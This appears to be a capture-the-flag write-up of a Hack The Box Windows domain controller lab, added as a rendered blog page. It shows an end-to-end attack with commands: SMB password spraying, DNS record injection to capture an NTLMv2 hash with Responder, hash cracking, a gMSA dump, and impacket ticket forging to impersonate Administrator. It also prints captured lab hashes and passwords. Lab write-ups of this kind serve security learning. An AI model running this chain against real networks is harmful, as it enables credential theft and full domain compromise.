@@ -1,0 +1,156 @@
+I"�E<h1 id="main-points">Main points</h1>
+<ul>
+  <li><a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a> for <a href="https://adsecurity.org/?p=1667">unconstrained delegation</a> (AD stuff) <a href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">More info in his blog</a></li>
+  <li></li>
+</ul>
+
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap-scan">nmap scan</h2>
+<h3 id="tcp">TCP</h3>
+<ul>
+  <li>53/tcp    open  domain        syn-ack Simple DNS Plus ^1fdf9c</li>
+  <li>80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0</li>
+  <li>88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-07-14 05:01:59Z)</li>
+  <li>135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</li>
+  <li>139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</li>
+  <li>389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</li>
+  <li>445/tcp   open  microsoft-ds? syn-ack</li>
+  <li>464/tcp   open  kpasswd5?     syn-ack</li>
+  <li>593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</li>
+  <li>636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</li>
+  <li>3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</li>
+  <li>3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</li>
+  <li>5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</li>
+  <li>9389/tcp  open  mc-nmf        syn-ack .NET Message Framing</li>
+  <li>49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</li>
+  <li>49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</li>
+  <li>49692/tcp open  msrpc         syn-ack Microsoft Windows RPC</li>
+  <li>49709/tcp open  msrpc         syn-ack Microsoft Windows RPC</li>
+  <li>49713/tcp open  msrpc         syn-ack Microsoft Windows RPC</li>
+  <li>59643/tcp open  msrpc         syn-ack Microsoft Windows RPC
+    <h3 id="udp">UDP</h3>
+  </li>
+  <li>53/udp  open  domain       udp-response ttl 127 (generic dns response: SERVFAIL)</li>
+  <li>88/udp  open  kerberos-sec udp-response         Microsoft Windows Kerberos (server time: 2021-07-14 06:45:17Z)</li>
+  <li>123/udp open  ntp          udp-response         NTP v3</li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">download</code> button redirects to a pdf, which name is of the format <code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-upload.pdf</code>. Let’s iterate through the whole year of 2020 to download the files if they exist and see if there are any interesting pdf files.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+<span class="k">for</span> <span class="n">month</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">13</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">day</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>
+		<span class="n">name</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"2020-</span><span class="si">{</span><span class="n">month</span><span class="p">:</span><span class="mi">02</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">day</span><span class="p">:</span><span class="mi">02</span><span class="si">}</span><span class="s">-upload.pdf"</span>
+		<span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://10.10.10.248/documents/</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+		<span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">pdf</span><span class="p">:</span>
+			<span class="n">pdf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The interesting ones are
+<code class="language-plaintext highlighter-rouge">2020-12-30-upload.pdf</code> and <code class="language-plaintext highlighter-rouge">2020-06-04-upload.pdf</code></p>
+
+<p>From <code class="language-plaintext highlighter-rouge">2020-06-04-upload</code>
+We see there is a default password <code class="language-plaintext highlighter-rouge">NewIntelligenceCorpUser9876</code></p>
+
+<p>And from the other file we see</p>
+<blockquote>
+  <p>Internal IT UpdateThere has recently been some outages on our web servers. Ted has gotten a script in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the process of locking down our service accounts</p>
+</blockquote>
+
+<p>Maybe <code class="language-plaintext highlighter-rouge">Ted</code> is an username.</p>
+
+<p>We use <code class="language-plaintext highlighter-rouge">exiftool</code> to see if there are some useful metadata on the PDFs.
+We see there is a <code class="language-plaintext highlighter-rouge">Creator</code> field, which contain usernames, let’s get the <code class="language-plaintext highlighter-rouge">Creator</code> of all the pdfs we downloaded.
+<code class="language-plaintext highlighter-rouge">exiftool *.pdf -Creator &gt; wordlist-user.txt</code></p>
+
+<p>We have our wordlist now.</p>
+
+<p>Let’s iterate through our file and try to connect to SMB with the default password <code class="language-plaintext highlighter-rouge">NewIntelligenceCorpUser9876</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>user <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> ./usernames-wordlist<span class="si">)</span><span class="p">;</span> <span class="k">do </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.248<span class="se">\\</span> <span class="nt">--user</span> <span class="k">${</span><span class="nv">user</span><span class="k">}</span>%NewIntelligenceCorpUser9876<span class="p">;</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> <span class="k">done</span> 
+</code></pre></div></div>
+
+<h2 id="user">User</h2>
+<p>We see we have a successful login with <code class="language-plaintext highlighter-rouge">Tiffany.Molina</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient  <span class="se">\\\\</span>10.10.10.248<span class="se">\\</span>Users<span class="se">\\</span> <span class="nt">--user</span> Tiffany.Molina%NewIntelligenceCorpUser9876
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210724011101.png" alt="Pasted image 20210724011101.png" /></p>
+
+<p>Let’s login to smb to <code class="language-plaintext highlighter-rouge">\User</code> share
+<img src="/assets/Pasted%20image%2020210724011402.png" alt="Pasted image 20210724011402.png" /></p>
+
+<p>We go to <code class="language-plaintext highlighter-rouge">Desktop</code> and we have user flag
+<img src="/assets/Pasted%20image%2020210724011539.png" alt="Pasted image 20210724011539.png" /></p>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>From the list of the shares
+<img src="/assets/Pasted%20image%2020210724011825.png" alt="Pasted image 20210724011825.png" /></p>
+
+<p>Let’s check the <code class="language-plaintext highlighter-rouge">IT</code> folder</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient  <span class="se">\\\\</span>10.10.10.248<span class="se">\\</span>IT<span class="se">\\</span> <span class="nt">--user</span> Tiffany.Molina%NewIntelligenceCorpUser9876
+</code></pre></div></div>
+<p>We see there is a PowerShell script
+<img src="/assets/Pasted%20image%2020210724011923.png" alt="Pasted image 20210724011923.png" />
+Let’s download it</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> 
+</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$record</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
+</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span><span class="nv">$request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
+</span><span class="kr">if</span><span class="p">(</span><span class="o">.</span><span class="nf">StatusCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span><span class="n">Send-MailMessage</span><span class="w"> </span><span class="nt">-From</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-To</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-Subject</span><span class="w"> </span><span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> is down"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span></code></pre></div></div>
+<p>This script is scheduled to run every 5 min, it fetches the DNS records <code class="language-plaintext highlighter-rouge">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</code> and filter with<code class="language-plaintext highlighter-rouge">web*</code>, so all the records will start with <code class="language-plaintext highlighter-rouge">web</code>
+Then it will query this website using the default credentials, and if it’s down, it will send an email to Ted Graves. So if we add our own <code class="language-plaintext highlighter-rouge">web*</code> record to the DNS records, we can get Ted Graves credentials.</p>
+
+<p>So, using the user creds of Tiffany Molina, we can add our URL <code class="language-plaintext highlighter-rouge">webpico.intelligence.htb</code> to the DNS records. We can do that using <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool</a> from <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dnstool.py <span class="nt">-u</span> <span class="s1">'intelligence.htb\Tiffany.Molina'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">-a</span> add <span class="nt">-r</span> <span class="s1">'webpico.intelligence.htb'</span> <span class="nt">-d</span> 10.10.14.106 10.10.10.248
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210726001102.png" alt="Pasted image 20210726001102.png" /></p>
+
+<p>And now we start <code class="language-plaintext highlighter-rouge">responder</code> and start capturing packets from the interface <code class="language-plaintext highlighter-rouge">tun0</code> since the box will communicate with us through this interface. And we wait until the script triggers (it takes ~5min)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/share/responder/Responder.py <span class="nt">-I</span> tun0 <span class="nt">-A</span> 
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210726003917.png" alt="Pasted image 20210726003917.png" />
+We have the NTLM hash of Ted Graves
+<img src="/assets/Pasted%20image%2020210726005325.png" alt="Pasted image 20210726005325.png" /></p>
+<pre><code class="language-code">[HTTP] NTLMv2 Client   : 10.10.10.248
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:8c98e34ff25ae81a:F3E37A251792077C96264CE5548C4023:01010000000000002E43EAC6E381D701E4CC5C8351C2D0BD000000000200080059005A004900570001001E00570049004E002D00520047005100340047004400360045003900320045000400140059005A00490057002E004C004F00430041004C0003003400570049004E002D00520047005100340047004400360045003900320045002E0059005A00490057002E004C004F00430041004C000500140059005A00490057002E004C004F00430041004C000800300030000000000000000000000000200000AC0397AF3ED5EC43E7F6967E763B43E89EBAB2A62243DE6603BFC5D72100C7010A0010000000000000000000000000000000000009003A0048005400540050002F007700650062007000690063006F002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
+</code></pre>
+<p>Let’s crack it with <code class="language-plaintext highlighter-rouge">John</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--format</span><span class="o">=</span>netNTLMv2 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Pasted%20image%2020210726005658.png" alt="Pasted image 20210726005658.png" />
+And now we have the password of Ted Graves <code class="language-plaintext highlighter-rouge">Mr.Teddy</code></p>
+
+<p>From Payloads all the things we can dump <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password">gMSA passwords</a> of group managed accounts</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ./gMSADumper/gMSADumper.py <span class="nt">-u</span> Ted.Graves <span class="nt">-p</span> Mr.Teddy  <span class="nt">-d</span> intelligence.htb
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210726082802.png" alt="Pasted image 20210726082802.png" />
+We get the NThash, let’s get the silver ticket with impacket getST. We can get the spn with a LDAP search  for <code class="language-plaintext highlighter-rouge">msDS-AllowedToDelegateTo:</code> to see if Ted have delegation rights</p>
+
+<p>We get the silver ticket with impacket and the hash we got previously and we try to impersonate administrator</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-getST intelligence.htb/svc_int<span class="nv">$ </span><span class="nt">-spn</span> WWW/dc.intelligence.htb <span class="nt">-hashes</span> :47e89a6afd68e3872ef1acaf91d0b2f7 <span class="nt">-impersonate</span> Administrator
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210726081755.png" alt="Pasted image 20210726081755.png" />
+<img src="/assets/Pasted%20image%2020210726083147.png" alt="Pasted image 20210726083147.png" />
+We export the <code class="language-plaintext highlighter-rouge">Administrator.ccache</code> 
+<code class="language-plaintext highlighter-rouge">export KRB5CCNAME=Administrator.ccache</code>
+so that other impacket script can access it</p>
+
+<p>we connect to smb</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient.py <span class="nt">-k</span> intelligence.htb/Administrator@dc.intelligence.htb <span class="nt">-no-pass</span> 
+</code></pre></div></div>
+
+<p><img src="/assets/Pasted%20image%2020210726083533.png" alt="Pasted image 20210726083533.png" /></p>
+
+<p>And we have root flag</p>
+:ET
